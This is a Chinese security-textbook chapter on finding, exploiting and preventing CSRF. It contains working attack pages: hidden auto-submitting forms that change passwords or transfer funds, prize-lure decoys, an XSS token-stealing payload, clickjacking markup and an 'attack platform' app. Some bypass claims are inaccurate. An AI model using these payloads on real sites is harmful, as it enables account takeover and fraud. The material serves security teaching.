# 第八章 CSRF与SSRF漏洞挖掘

## 8.1 CSRF漏洞概述

### 8.1.1 什么是CSRF

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种攻击方式，攻击者诱导用户访问恶意页面，利用用户已认证的身份，在用户不知情的情况下向目标网站发送请求，执行非预期的操作。

**通俗理解**

想象你刚登录了银行网站，浏览器保存了你的登录状态（Cookie）。此时，攻击者诱导你点击了一个恶意链接，这个链接会自动向银行发送转账请求。由于你的浏览器会自动带上银行的Cookie，银行服务器会认为这是你的合法请求，从而执行转账操作。

**CSRF与XSS的区别**

| 特征 | CSRF | XSS |
|-----|------|-----|
| 攻击方式 | 伪造用户请求 | 注入恶意脚本 |
| 依赖条件 | 用户已登录 | 无需登录 |
| 攻击目标 | 用户的操作权限 | 用户的敏感数据 |
| 防护方式 | CSRF Token | 输入输出过滤 |
| 是否需要用户交互 | 需要 | 不一定 |

### 8.1.2 CSRF的危害

CSRF攻击可能导致以下严重后果：

1. **账户操作**：修改密码、绑定手机、设置密保问题
2. **资金操作**：转账、支付、修改收款账户
3. **信息泄露**：获取用户敏感信息
4. **权限提升**：添加管理员账户、修改权限
5. **内容篡改**：发布文章、发送消息、修改配置

**真实案例**

2018年，某知名社交平台存在CSRF漏洞，攻击者可以诱导用户点击恶意链接，自动关注攻击者账号、转发恶意内容，导致大规模蠕虫传播。

### 8.1.3 CSRF攻击原理

**攻击流程图**

```
┌─────────┐      ┌─────────┐      ┌─────────┐
│  用户   │─────▶│恶意页面 │─────▶│目标网站 │
└─────────┘      └─────────┘      └─────────┘
     │                                  │
     │  1. 用户登录目标网站              │
     │  2. 用户访问恶意页面              │
     │  3. 恶意页面自动发送请求          │
     │  4. 浏览器携带Cookie             │
     │  5. 目标网站执行操作              │
     └──────────────────────────────────┘
```

**核心原理**

1. 用户已登录目标网站，浏览器保存了认证Cookie
2. 攻击者构造恶意页面，包含向目标网站发送的请求
3. 用户访问恶意页面，浏览器自动发送请求并携带Cookie
4. 目标网站验证Cookie通过，执行请求操作

## 8.2 CSRF漏洞类型详解

### 8.2.1 基础CSRF类型

**GET型CSRF**

GET型CSRF利用HTTP GET请求实现攻击，通常使用img标签、a标签等自动触发。

```html
<!-- 利用img标签自动触发GET请求 -->
<img src="http://bank.example.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- 利用a标签需要用户点击 -->
<a href="http://bank.example.com/transfer?to=attacker&amount=10000">查看详情</a>

<!-- 利用iframe自动加载 -->
<iframe src="http://bank.example.com/transfer?to=attacker&amount=10000" style="display:none"></iframe>
```

**POST型CSRF**

POST型CSRF需要构造表单并自动提交，比GET型更隐蔽。

```html
<!-- 隐藏表单自动提交 -->
<form id="csrf_form" action="http://bank.example.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById("csrf_form").submit();</script>
```

### 8.2.2 JSON CSRF

**漏洞原理**

当后端API接收JSON格式数据时，如果没有正确验证请求来源，攻击者可以构造JSON CSRF攻击。

**漏洞场景**

```javascript
// 后端API接收JSON数据
app.post('/api/transfer', function(req, res) {
    var data = req.body;
    transfer(data.to, data.amount);
});
```

**攻击方式**

```html
<!-- 方法1：使用fetch发送JSON请求 -->
<script>
fetch('http://target.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'text/plain'
    },
    body: JSON.stringify({
        to: 'attacker_account',
        amount: 10000
    })
});
</script>

<!-- 方法2：使用XMLHttpRequest -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/transfer', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'text/plain');
xhr.send(JSON.stringify({
    to: 'attacker_account',
    amount: 10000
}));
</script>

<!-- 方法3：使用表单提交JSON（某些后端会解析） -->
<form action="http://target.com/api/transfer" method="POST" enctype="application/json">
    <input type="hidden" name='{"to":"attacker","amount":10000}' value="">
</form>
<script>document.forms[0].submit();</script>
```

**绕过Content-Type验证**

```html
<!-- 如果服务器只验证Content-Type是否为application/json -->
<script>
fetch('http://target.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json; charset=utf-8'
    },
    body: JSON.stringify({
        to: 'attacker_account',
        amount: 10000
    })
});
</script>
```

### 8.2.3 Flash CSRF

**漏洞原理**

Flash应用可以跨域发送HTTP请求，如果Flash应用的策略文件配置不当，攻击者可以利用Flash发起CSRF攻击。

**漏洞场景**

```xml
<!-- crossdomain.xml配置不当 -->
<cross-domain-policy>
    <allow-access-from domain="*" />
</cross-domain-policy>
```

**攻击方式**

```actionscript
// Flash AS3代码
var request:URLRequest = new URLRequest("http://target.com/api/action");
request.method = URLRequestMethod.POST;
request.data = "param=value";

var loader:URLLoader = new URLLoader();
loader.load(request);
```

**防护方法**

```xml
<!-- 正确的crossdomain.xml配置 -->
<cross-domain-policy>
    <allow-access-from domain="*.example.com" />
</cross-domain-policy>
```

### 8.2.4 Referer CSRF

**漏洞原理**

服务器通过验证Referer头来判断请求来源，如果验证逻辑存在缺陷，攻击者可以绕过验证。

**常见验证缺陷**

```text
1. 只检查Referer是否包含目标域名
2. 只检查Referer是否存在
3. 允许空Referer
4. 子域名验证不严
```

**攻击方式**

```http
# 方式1：使用空Referer
GET /api/action?param=value HTTP/1.1
Host: example.com
Referer:

# 方式2：使用包含目标域名的URL
GET /api/action?param=value HTTP/1.1
Host: example.com
Referer: http://example.com.attacker.com/evil.html

# 方式3：使用参数形式包含目标域名
GET /api/action?param=value HTTP/1.1
Host: example.com
Referer: http://attacker.com/?url=example.com

# 方式4：使用目标域名作为路径
GET /api/action?param=value HTTP/1.1
Host: example.com
Referer: http://attacker.com/example.com/
```

### 8.2.5 SameSite绕过

**SameSite属性说明**

| 属性值 | 说明 | 防护效果 |
|-------|------|---------|
| Strict | 完全禁止第三方Cookie | 最强 |
| Lax | 允许GET请求携带Cookie | 较强 |
| None | 不限制 | 无 |

**SameSite绕过技巧**

```text
1. Lax模式下GET请求仍然会携带Cookie
2. 使用iframe+form提交可以绕过Lax模式
3. 使用WebSocket连接
4. 使用HTTP/2特性
5. 利用浏览器漏洞
```

**绕过示例**

```html
<!-- Lax模式下的绕过方法 -->
<script>
// 使用iframe加载目标页面，然后提交表单
var iframe = document.createElement('iframe');
iframe.src = 'http://target.com/form-page';
iframe.onload = function() {
    var form = iframe.contentDocument.getElementById('transfer-form');
    form.submit();
};
document.body.appendChild(iframe);
</script>

<!-- 使用formaction属性绕过 -->
<form action="http://target.com/api/action" method="GET">
    <input type="hidden" name="param" value="value">
    <button formaction="http://target.com/api/action">点击</button>
</form>
```

## 8.3 CSRF漏洞挖掘实战过程

### 8.3.1 完整挖掘流程

**第一步：信息收集**

```text
目标网站分析：
1. 确定目标网站的业务功能
2. 找出敏感操作（修改密码、转账、支付等）
3. 分析认证机制（Cookie、Session、Token等）
4. 观察请求方式（GET/POST）
5. 记录所有敏感操作的URL和参数
```

**第二步：漏洞检测**

```text
检测步骤：
1. 登录目标网站
2. 找到敏感操作（如修改密码）
3. 抓取操作请求
4. 分析请求是否包含CSRF防护措施
5. 尝试删除防护措施后重放请求
6. 记录检测结果
```

**第三步：漏洞验证**

```text
验证步骤：
1. 构造PoC（利用HTML页面）
2. 使用另一个浏览器打开PoC页面
3. 观察是否成功执行操作
4. 确认漏洞存在
```

**第四步：漏洞利用**

```text
利用步骤：
1. 构造完整的攻击页面
2. 诱导目标用户访问
3. 用户不知情地执行操作
4. 完成攻击
```

### 8.3.2 实战案例：某电商平台CSRF挖掘

**信息收集阶段**

```text
目标网站：shop.example.com

敏感操作列表：
1. 修改密码：POST /api/user/change-password
   参数：old_password, new_password, confirm_password
   
2. 修改收货地址：POST /api/user/address
   参数：address_id, address, phone
   
3. 绑定手机：POST /api/user/bind-phone
   参数：phone, code
   
4. 添加收货地址：POST /api/user/address/add
   参数：address, phone, name
```

**漏洞检测阶段**

```http
# 修改密码请求分析
POST /api/user/change-password HTTP/1.1
Host: shop.example.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

old_password=oldpass&new_password=newpass&confirm_password=newpass

# 发现问题：没有CSRF Token，没有Referer验证
```

**漏洞验证阶段**

```html
<!-- 构造PoC -->
<!DOCTYPE html>
<html>
<head>
    <title>领取优惠券</title>
</head>
<body>
    <h1>恭喜您获得100元优惠券！</h1>
    <p>正在为您领取...</p>
    <form id="csrf" action="https://shop.example.com/api/user/change-password" method="POST">
        <input type="hidden" name="old_password" value="victim_password">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    <script>
        document.getElementById("csrf").submit();
    </script>
</body>
</html>
```

**漏洞利用阶段**

```text
1. 将PoC上传到攻击者服务器
2. 通过社交工程诱导用户访问
3. 用户登录状态下访问恶意页面
4. 密码被修改为hacked123
5. 攻击者获得账户控制权
```

## 8.4 CSRF绕过技巧

### 8.4.1 Token绕过技巧

**技巧1：Token未绑定Session**

```text
原理：Token虽然存在，但未与用户Session绑定
方法：获取任意用户的Token，用于攻击其他用户

测试步骤：
1. 用户A登录，获取Token_A
2. 用户B登录，获取Token_B
3. 用户A使用Token_B发送请求
4. 如果成功，Token未绑定Session
```

**技巧2：Token可预测**

```text
原理：Token生成算法存在缺陷，可被预测
方法：分析Token生成规律，预测有效Token

测试步骤：
1. 多次请求获取Token样本
2. 分析Token规律
3. 尝试构造有效Token
```

**技巧3：Token在响应中泄露**

```text
原理：Token在HTTP响应中返回，可被窃取
方法：通过其他漏洞获取Token

测试步骤：
1. 发起请求获取Token
2. 检查响应是否包含Token
3. 如果包含，可被利用
```

**技巧4：Token存储不当**

```text
原理：Token存储在LocalStorage或Cookie中，可被XSS窃取
方法：利用XSS漏洞获取Token

测试步骤：
1. 检查Token存储位置
2. 测试是否存在XSS漏洞
3. 如果存在，可获取Token
```

### 8.4.2 Referer绕过技巧

**技巧5：空Referer绕过**

```http
# 删除Referer头
GET /api/action?param=value HTTP/1.1
Host: example.com
Cookie: session=abc123

# 如果服务器允许空Referer，存在漏洞
```

**技巧6：子域名绕过**

```http
# 使用子域名欺骗
GET /api/action?param=value HTTP/1.1
Host: example.com
Cookie: session=abc123
Referer: http://attacker.example.com/evil.html

# 如果服务器只检查是否包含example.com，可能被绕过
```

**技巧7：参数形式绕过**

```http
# 在参数中包含目标域名
GET /api/action?param=value HTTP/1.1
Host: example.com
Cookie: session=abc123
Referer: http://attacker.com/?domain=example.com

# 如果服务器检查Referer是否包含目标域名，可能被绕过
```

**技巧8：路径形式绕过**

```http
# 在路径中包含目标域名
GET /api/action?param=value HTTP/1.1
Host: example.com
Cookie: session=abc123
Referer: http://attacker.com/example.com/evil.html

# 如果服务器检查Referer是否包含目标域名，可能被绕过
```

### 8.4.3 SameSite绕过技巧

**技巧9：Lax模式下的GET请求**

```html
<!-- Lax模式允许GET请求携带Cookie -->
<img src="http://bank.example.com/transfer?to=attacker&amount=10000" style="display:none">
```

**技巧10：iframe+表单绕过**

```html
<!-- 使用iframe加载表单页面 -->
<iframe src="http://target.com/form-page" id="csrf_iframe" style="display:none"></iframe>
<script>
    document.getElementById('csrf_iframe').onload = function() {
        var iframeDoc = this.contentDocument || this.contentWindow.document;
        var form = iframeDoc.getElementById('transfer-form');
        form.elements['to'].value = 'attacker';
        form.elements['amount'].value = '10000';
        form.submit();
    };
</script>
```

**技巧11：WebSocket连接**

```javascript
// WebSocket连接不受SameSite限制
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify({action: 'transfer', to: 'attacker', amount: 10000}));
};
```

### 8.4.4 其他绕过技巧

**技巧12：使用Flash代理**

```actionscript
// Flash可以绕过某些浏览器限制
var request:URLRequest = new URLRequest("http://target.com/api/action");
request.method = URLRequestMethod.POST;
request.data = "param=value";
var loader:URLLoader = new URLLoader();
loader.load(request);
```

**技巧13：使用Java Applet**

```java
// Java Applet可以发起跨域请求
URL url = new URL("http://target.com/api/action");
URLConnection conn = url.openConnection();
conn.setDoOutput(true);
OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
wr.write("param=value");
wr.flush();
```

**技巧14：利用浏览器插件**

```text
原理：某些浏览器插件可以修改请求头
方法：编写恶意插件，自动发送CSRF请求
```

**技巧15：利用浏览器漏洞**

```text
原理：浏览器本身存在漏洞，可被利用
方法：利用最新的浏览器漏洞绕过防护
```

## 8.5 CSRF漏洞检测

### 8.5.1 手工检测方法

**基本检测步骤**

1. 登录目标网站，找到敏感操作（修改密码、转账等）
2. 抓取该操作的请求
3. 分析请求是否包含CSRF防护措施
4. 尝试删除防护措施后重放请求

**检测要点**

```text
检查项：
□ 请求是否包含CSRF Token
□ Token是否可预测
□ Token是否与Session绑定
□ 是否验证Referer头
□ 是否验证SameSite属性
□ 是否使用POST请求
□ 是否有验证码保护
□ 是否有二次验证
```

**Burp Suite检测**

```
步骤1：拦截敏感操作请求
步骤2：发送到Repeater
步骤3：删除CSRF Token参数
步骤4：重放请求
步骤5：观察是否成功执行
步骤6：尝试修改Token值
步骤7：尝试使用其他用户的Token
```

**示例请求分析**

```http
POST /api/change-password HTTP/1.1
Host: example.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

current_password=oldpass&new_password=newpass&confirm_password=newpass&csrf_token=xyz789
```

**检测方法**

```text
方法1：删除csrf_token参数
方法2：使用其他用户的csrf_token
方法3：使用空的csrf_token
方法4：修改csrf_token值
方法5：删除Referer头
方法6：修改Referer为攻击者域名
```

### 8.5.2 CSRF Token检测

**Token存在性检测**

```http
# 原始请求
POST /api/transfer HTTP/1.1
Host: bank.example.com
Cookie: session=abc123

amount=100&to_account=123456&token=xyz789

# 删除Token后请求
POST /api/transfer HTTP/1.1
Host: bank.example.com
Cookie: session=abc123

amount=100&to_account=123456

# 如果请求成功，存在CSRF漏洞
```

**Token有效性检测**

```text
测试场景：
1. 使用同一用户的不同Token
2. 使用其他用户的Token
3. 使用过期的Token
4. 使用随机生成的Token
5. 使用空Token
```

**Token绑定检测**

```text
检测Token是否与Session绑定：
1. 用户A登录，获取Token_A
2. 用户B登录，获取Token_B
3. 用户A使用Token_B发送请求
4. 如果成功，Token未与Session绑定
```

### 8.5.3 Referer检测

**Referer验证检测**

```http
# 删除Referer头
POST /api/change-password HTTP/1.1
Host: example.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

new_password=newpass

# 如果成功，存在CSRF漏洞
```

**Referer绕过检测**

```text
常见绕过方式：
1. 删除Referer头
2. 修改Referer为空
3. 使用目标域名作为子域名：attacker.example.com
4. 使用目标域名作为路径：http://attacker.com/example.com/
5. 使用目标域名作为参数：http://attacker.com/?example.com
6. 使用IP地址代替域名
7. 使用localhost代替域名
```

**绕过示例**

```http
# 方式1：空Referer
Referer: 

# 方式2：包含目标域名
Referer: http://example.com.attacker.com/evil.html

# 方式3：参数形式
Referer: http://attacker.com/?url=example.com

# 方式4：IP地址
Referer: http://192.168.1.100/

# 方式5：localhost
Referer: http://localhost/
```

### 8.5.4 自动化检测工具

**CSRF Tester**

```bash
# 安装
pip install csrf-tester

# 使用
csrf-tester -u "http://example.com/api/change-password" -c "session=abc123"
```

**Burp Suite Engagement Tools**

```
步骤：
1. 右键 → Engagement tools → Generate CSRF PoC
2. 查看生成的HTML代码
3. 测试是否可以成功触发请求
4. 修改PoC适应不同场景
```

**自定义脚本检测**

```python
import requests
from urllib.parse import urlparse, urlencode

def check_csrf(url, cookies, data, method='POST'):
    """
    检测CSRF漏洞
    """
    print(f"[*] 检测URL: {url}")
    
    # 发送原始请求（作为基准）
    if method == 'POST':
        original_response = requests.post(url, cookies=cookies, data=data)
    else:
        original_response = requests.get(url, cookies=cookies, params=data)
    
    print(f"[*] 原始请求状态码: {original_response.status_code}")
    
    # 测试1：删除Token参数
    data_no_token = {k: v for k, v in data.items() if 'csrf' not in k.lower() and 'token' not in k.lower()}
    
    if method == 'POST':
        response1 = requests.post(url, cookies=cookies, data=data_no_token)
    else:
        response1 = requests.get(url, cookies=cookies, params=data_no_token)
    
    if response1.status_code == original_response.status_code:
        print("[!] 可能存在CSRF漏洞：删除Token后请求成功")
        return True
    
    # 测试2：空Referer
    headers = {'Referer': ''}
    if method == 'POST':
        response2 = requests.post(url, cookies=cookies, data=data, headers=headers)
    else:
        response2 = requests.get(url, cookies=cookies, params=data, headers=headers)
    
    if response2.status_code == original_response.status_code:
        print("[!] 可能存在CSRF漏洞：空Referer请求成功")
        return True
    
    # 测试3：伪造Referer
    headers = {'Referer': 'http://attacker.com/evil.html'}
    if method == 'POST':
        response3 = requests.post(url, cookies=cookies, data=data, headers=headers)
    else:
        response3 = requests.get(url, cookies=cookies, params=data, headers=headers)
    
    if response3.status_code == original_response.status_code:
        print("[!] 可能存在CSRF漏洞：伪造Referer请求成功")
        return True
    
    print("[+] 存在CSRF防护")
    return False

# 使用示例
url = "http://example.com/api/change-password"
cookies = {"session": "abc123"}
data = {"current_password": "oldpass", "new_password": "newpass", "csrf_token": "xyz789"}

check_csrf(url, cookies, data)
```

## 8.6 CSRF漏洞利用

### 8.6.1 GET型CSRF

**漏洞场景**

```php
<?php
// 不安全的GET请求处理
session_start();
if($_SESSION['user']) {
    $to = $_GET['to'];
    $amount = $_GET['amount'];
    // 执行转账操作
    transfer($_SESSION['user'], $to, $amount);
}
?>
```

**攻击方式**

```html
<!-- 恶意页面 -->
<!DOCTYPE html>
<html>
<head>
    <title>恭喜您中奖了！</title>
</head>
<body>
    <h1>恭喜您获得iPhone 15！</h1>
    <img src="http://bank.example.com/transfer?to=attacker&amount=10000" 
         style="display:none">
    <p>请填写收货地址...</p>
</body>
</html>
```

**利用方式**

1. 构造恶意链接或页面
2. 诱导已登录用户访问
3. 自动发送GET请求
4. 目标网站执行操作

### 8.6.2 POST型CSRF

**漏洞场景**

```php
<?php
// 不安全的POST请求处理
session_start();
if($_SESSION['user'] && $_SERVER['REQUEST_METHOD'] == 'POST') {
    $to = $_POST['to'];
    $amount = $_POST['amount'];
    // 执行转账操作
    transfer($_SESSION['user'], $to, $amount);
}
?>
```

**攻击方式**

```html
<!DOCTYPE html>
<html>
<head>
    <title>免费领取优惠券</title>
</head>
<body>
    <h1>点击领取优惠券</h1>
    <form id="csrf_form" action="http://bank.example.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    <script>
        // 自动提交表单
        document.getElementById("csrf_form").submit();
    </script>
</body>
</html>
```

**隐藏表单自动提交**

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin: 0; padding: 0; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>正在加载，请稍候...</h1>
    <iframe name="csrf_frame"></iframe>
    <form id="csrf_form" action="http://target.com/api/change-password" 
          method="POST" target="csrf_frame">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    <script>
        window.onload = function() {
            document.getElementById("csrf_form").submit();
        };
    </script>
</body>
</html>
```

### 8.6.3 CSRF组合攻击

**CSRF + XSS**

```text
攻击思路：
1. 利用XSS漏洞获取CSRF Token
2. 构造包含有效Token的CSRF请求
3. 绕过CSRF防护

示例：
1. 存储型XSS注入恶意脚本
2. 脚本获取当前页面的CSRF Token
3. 发送带有Token的恶意请求
```

```javascript
// XSS Payload获取CSRF Token
var csrfToken = document.querySelector('input[name="csrf_token"]').value;

// 发送恶意请求
fetch('/api/change-password', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'new_password=hacked123&csrf_token=' + csrfToken
});
```

**CSRF + Clickjacking**

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: 2;
        }
        .decoy {
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="decoy">
        <button>点击领取大奖</button>
    </div>
    <iframe src="http://target.com/delete-account"></iframe>
</body>
</html>
```

**CSRF + SSRF**

```text
攻击思路：
1. 利用CSRF让用户触发SSRF漏洞
2. 用户浏览器发送请求到目标网站
3. 目标网站服务器发起SSRF请求
4. 实现内网探测或攻击
```

### 8.6.4 CSRF PoC生成

**Burp Suite生成PoC**

```
步骤：
1. 拦截请求
2. 右键 → Engagement tools → Generate CSRF PoC
3. 选择生成方式（表单/iframe/XHR）
4. 复制HTML代码
5. 保存为HTML文件测试
6. 根据需要修改PoC
```

**手动构造PoC**

```html
<!-- GET请求PoC -->
<img src="http://target.com/api/action?param=value" style="display:none">

<!-- POST请求PoC -->
<form action="http://target.com/api/action" method="POST" id="csrf_form">
    <input type="hidden" name="param1" value="value1">
    <input type="hidden" name="param2" value="value2">
</form>
<script>document.getElementById("csrf_form").submit();</script>

<!-- JSON请求PoC -->
<script>
fetch('http://target.com/api/action', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"param1":"value1","param2":"value2"}'
});
</script>

<!-- 带Token的CSRF（需要结合XSS） -->
<script>
var token = document.querySelector('input[name="csrf_token"]').value;
fetch('http://target.com/api/action', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'param=value&csrf_token=' + token
});
</script>
```

## 8.7 CSRF利用平台搭建

### 8.7.1 平台架构设计

**平台功能模块**

```text
1. PoC管理模块
   - 创建、编辑、删除PoC
   - PoC模板库
   - PoC分类管理

2. 攻击管理模块
   - 发起CSRF攻击
   - 攻击状态监控
   - 攻击结果统计

3. 目标管理模块
   - 目标网站管理
   - 敏感操作记录
   - 漏洞检测记录

4. 报告生成模块
   - 漏洞报告生成
   - 攻击报告生成
   - 统计报表
```

### 8.7.2 平台搭建步骤

**步骤1：环境准备**

```bash
# 安装Python和依赖
pip install flask flask-sqlalchemy requests

# 创建项目目录
mkdir csrf-platform
cd csrf-platform
```

**步骤2：创建数据库模型**

```python
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

class Target(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    url = db.Column(db.String(500), nullable=False)
    description = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Poc(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    target_id = db.Column(db.Integer, db.ForeignKey('target.id'))
    type = db.Column(db.String(20))  # GET, POST, JSON
    html_content = db.Column(db.Text)
    payload = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Attack(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    poc_id = db.Column(db.Integer, db.ForeignKey('poc.id'))
    status = db.Column(db.String(20))  # pending, running, completed, failed
    target_url = db.Column(db.String(500))
    executed_at = db.Column(db.DateTime)
    result = db.Column(db.Text)
```

**步骤3：创建Flask应用**

```python
from flask import Flask, render_template, request, redirect, url_for
from models import db, Target, Poc, Attack

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///csrf_platform.db'
db.init_app(app)

# 目标管理
@app.route('/targets')
def list_targets():
    targets = Target.query.all()
    return render_template('targets.html', targets=targets)

@app.route('/targets/add', methods=['GET', 'POST'])
def add_target():
    if request.method == 'POST':
        target = Target(
            name=request.form['name'],
            url=request.form['url'],
            description=request.form['description']
        )
        db.session.add(target)
        db.session.commit()
        return redirect(url_for('list_targets'))
    return render_template('add_target.html')

# PoC管理
@app.route('/pocs')
def list_pocs():
    pocs = Poc.query.all()
    return render_template('pocs.html', pocs=pocs)

@app.route('/pocs/add', methods=['GET', 'POST'])
def add_poc():
    if request.method == 'POST':
        poc = Poc(
            name=request.form['name'],
            target_id=request.form['target_id'],
            type=request.form['type'],
            html_content=request.form['html_content'],
            payload=request.form['payload']
        )
        db.session.add(poc)
        db.session.commit()
        return redirect(url_for('list_pocs'))
    targets = Target.query.all()
    return render_template('add_poc.html', targets=targets)

# 攻击管理
@app.route('/attacks')
def list_attacks():
    attacks = Attack.query.all()
    return render_template('attacks.html', attacks=attacks)

@app.route('/attacks/execute/<int:poc_id>')
def execute_attack(poc_id):
    poc = Poc.query.get_or_404(poc_id)
    attack = Attack(
        poc_id=poc_id,
        status='running',
        target_url=poc.target.url
    )
    db.session.add(attack)
    db.session.commit()
    
    # 执行攻击逻辑
    # ...
    
    attack.status = 'completed'
    db.session.commit()
    
    return redirect(url_for('list_attacks'))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000)
```

**步骤4：创建前端页面**

```html
<!-- templates/pocs.html -->
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC管理</title>
</head>
<body>
    <h1>CSRF PoC管理</h1>
    <a href="/pocs/add">添加PoC</a>
    <table>
        <tr>
            <th>ID</th>
            <th>名称</th>
            <th>类型</th>
            <th>目标</th>
            <th>操作</th>
        </tr>
        {% for poc in pocs %}
        <tr>
            <td>{{ poc.id }}</td>
            <td>{{ poc.name }}</td>
            <td>{{ poc.type }}</td>
            <td>{{ poc.target.name }}</td>
            <td><a href="/attacks/execute/{{ poc.id }}">执行攻击</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
```

**步骤5：部署运行**

```bash
# 创建数据库
python -c "from app import app, db; app.app_context().push(); db.create_all()"

# 启动服务
python app.py

# 访问平台
http://localhost:5000
```

## 8.8 CSRF漏洞防护

### 8.8.1 CSRF Token防护

**Token生成与验证**

```php
<?php
// 生成CSRF Token
function generateCSRFToken() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// 验证CSRF Token
function validateCSRFToken($token) {
    return isset($_SESSION['csrf_token']) && 
           hash_equals($_SESSION['csrf_token'], $token);
}

// 使用示例
session_start();

// 生成Token并输出到表单
$csrf_token = generateCSRFToken();
?>

<form method="POST" action="/api/change-password">
    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
    <input type="password" name="new_password">
    <button type="submit">修改密码</button>
</form>

<?php
// 验证Token
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        die('CSRF Token验证失败');
    }
    // 执行操作
}
?>
```

**Token安全要求**

```text
1. 随机性：使用加密安全的随机数生成器
2. 唯一性：每个Session生成唯一Token
3. 绑定性：Token与Session绑定
4. 时效性：设置Token过期时间
5. 一次性：每次使用后更新Token
6. 保密性：Token不应出现在URL中
7. 长度：至少32字节的随机数据
```

**Java实现示例**

```java
import java.security.SecureRandom;
import java.util.Base64;

public class CSRFToken {
    
    // 生成Token
    public static String generateToken() {
        SecureRandom random = new SecureRandom();
        byte[] bytes = new byte[32];
        random.nextBytes(bytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
    }
    
    // 验证Token
    public static boolean validateToken(String sessionToken, String requestToken) {
        if (sessionToken == null || requestToken == null) {
            return false;
        }
        return sessionToken.equals(requestToken);
    }
}
```

**Python Flask实现**

```python
from flask import Flask, session, request
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token(token):
    return session.get('csrf_token') == token

@app.route('/change-password', methods=['GET', 'POST'])
def change_password():
    if request.method == 'POST':
        if not validate_csrf_token(request.form.get('csrf_token')):
            return 'CSRF验证失败', 403
        # 执行密码修改
        return '密码修改成功'
    
    return f'''
        <form method="POST">
            <input type="hidden" name="csrf_token" value="{generate_csrf_token()}">
            <input type="password" name="new_password">
            <button type="submit">修改密码</button>
        </form>
    '''
```

### 8.8.2 SameSite Cookie属性

**SameSite属性说明**

| 属性值 | 说明 | 防护效果 |
|-------|------|---------|
| Strict | 完全禁止第三方Cookie | 最强 |
| Lax | 允许GET请求携带Cookie | 较强 |
| None | 不限制 | 无 |

**设置方法**

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
```

**PHP设置**

```php
<?php
// 设置SameSite属性
setcookie('session', $session_id, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'  // 或 'Lax'
]);
?>
```

**Java Spring Boot设置**

```java
@Configuration
public class CookieConfig {
    
    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setCookieName("SESSION");
        serializer.setSameSite("Strict");
        serializer.setUseHttpOnlyCookie(true);
        serializer.setUseSecureCookie(true);
        return serializer;
    }
}
```

### 8.8.3 Referer验证

**验证Referer头**

```php
<?php
function validateReferer() {
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $allowed_domains = ['example.com', 'www.example.com'];
    
    if (empty($referer)) {
        return false;  // 拒绝空Referer
    }
    
    $referer_host = parse_url($referer, PHP_URL_HOST);
    
    foreach ($allowed_domains as $domain) {
        if ($referer_host === $domain || 
            preg_match('/\.' . preg_quote($domain, '/') . '$/', $referer_host)) {
            return true;
        }
    }
    
    return false;
}

// 使用
if (!validateReferer()) {
    die('非法请求来源');
}
?>
```

**Java实现**

```java
import javax.servlet.http.HttpServletRequest;
import java.net.URI;
import java.util.Arrays;
import java.util.List;

public class RefererValidator {
    
    private static final List<String> ALLOWED_DOMAINS = Arrays.asList(
        "example.com", 
        "www.example.com"
    );
    
    public static boolean validate(HttpServletRequest request) {
        String referer = request.getHeader("Referer");
        
